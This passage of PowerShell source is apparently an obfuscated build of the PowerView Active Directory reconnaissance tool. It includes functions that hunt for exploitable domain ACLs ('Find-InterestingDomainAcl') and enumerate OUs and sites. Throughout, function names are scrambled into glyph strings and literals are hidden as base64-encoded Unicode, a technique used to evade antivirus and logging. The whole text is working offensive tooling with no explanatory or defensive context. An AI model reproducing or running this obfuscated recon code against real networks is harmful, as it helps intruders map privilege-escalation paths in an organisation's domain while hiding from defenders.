        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${___/=\/=\__/====\} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/\______/\/==\__/} = @{}
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        _/==\/===\/=====\_ @_____/==\/=\___/\ | % {
            if ( ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAB8AFcAcgBpAHQAZQB8AEMAcgBlAGEAdABlAHwARABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AceQualifier -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))) {
                if ($_.SecurityIdentifier.Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAuACoALQBbADEALQA5AF0AXABkAHsAMwAsAH0AJAA=')))) {
                    if (${/\______/\/==\__/}[$_.SecurityIdentifier.Value]) {
                        ${______/\/=\/\_/=\}, ${__/\_/=\_/\/\_/\/}, ${/==\_/==\__/\/\__}, ${___/=\___/\/\/\_/} = ${/\______/\/==\__/}[$_.SecurityIdentifier.Value]
                        ${_/==\/\/==\_/\/\/} = New-Object PSObject
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                        }
                        else {
                            ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                        }
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) ${______/\/=\/\_/=\}
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) ${__/\_/=\_/\/\_/\/}
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) ${/==\_/==\__/\/\__}
                        ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) ${___/=\___/\/\/\_/}
                        ${_/==\/\/==\_/\/\/}
                    }
                    else {
                        ${/==\_/==\__/\/\__} = __/\/=\_/\/=\/=\_/ -Identity $_.SecurityIdentifier.Value -_/============\/\/ DN @___/=\/=\__/====\
                        if (${/==\_/==\__/\/\__}) {
                            ${__/\_/=\_/\/\_/\/} = ${/==\_/==\__/\/\__}.SubString(${/==\_/==\__/\/\__}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${__/\_/=\_/\/\_/\/}
                            ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/==\_/==\__/\/\__}
                            $Object = _____/\/==\/\_/=== @__/=\/=\_/=\/=\/=
                            if ($Object) {
                                ${______/\/=\/\_/=\} = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                                    ${___/=\___/\/\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                                    ${___/=\___/\/\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                                    ${___/=\___/\/\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                }
                                else {
                                    ${___/=\___/\/\/\_/} = $Null
                                }
                                ${/\______/\/==\__/}[$_.SecurityIdentifier.Value] = ${______/\/=\/\_/=\}, ${__/\_/=\_/\/\_/\/}, ${/==\_/==\__/\/\__}, ${___/=\___/\/\/\_/}
                                ${_/==\/\/==\_/\/\/} = New-Object PSObject
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                                }
                                else {
                                    ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                                }
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) ${______/\/=\/\_/=\}
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) ${__/\_/=\_/\/\_/\/}
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) ${/==\_/==\__/\/\__}
                                ${_/==\/\/==\_/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) ${___/=\___/\/\/\_/}
                                ${_/==\/\/==\_/\/\/}
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}
function _/====\/\/\/\/\/=\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${_/=\/==\/==\_/=\/\},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/===\/==\/===\/=} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    }
    PROCESS {
        if (${_/===\/==\/===\/=}) {
            ${__/\_/==\_/\/\___} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBPAFUAPQAuACoA')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXABfAF8ALwB9ACcAIABmAHIAbwBtACAAJwAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AJwA=')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                        ${_/===\/==\/===\/=} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        if (-not ${_/===\/==\/===\/=}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAXwBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwAvAH0AJwA=')))
                        }
                    }
                }
                else {
                    try {
                        ${_/=\_/=====\__/=\} = (-Join (([Guid]${/\______/===\__/\}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                    }
                    catch {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkA')))
                    }
                }
            }
            if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAE8AVQBzACAAdwBpAHQAaAAgACQAewBfAC8APQBcAC8APQA9AFwALwA9AD0AXABfAC8APQBcAC8AXAB9ACAAcwBlAHQAIABpAG4AIAB0AGgAZQAgAGcAcABMAGkAbgBrACAAcAByAG8AcABlAHIAdAB5AA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAJAB7AF8ALwA9AFwALwA9AD0AXAAvAD0APQBcAF8ALwA9AFwALwBcAH0AKgApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${_/===\/==\/===\/=}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $(${_/===\/==\/===\/=}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${_/===\/==\/===\/=}.FindOne() }
            else { ${_/\__/\/=====\_/\} = ${_/===\/==\/===\/=}.FindAll() }
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${/=\__/=\/\____/\_} = $_
                }
                else {
                    ${/=\__/=\/\____/\_} = _______/==\_/=\_/= -Properties $_.Properties
                }
                ${/=\__/=\/\____/\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBPAFUA'))))
                ${/=\__/=\/\____/\_}
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${_/===\/==\/===\/=}.dispose()
        }
    }
}
function _/\____/\____/===\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${_/=\/==\/==\_/=\/\},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
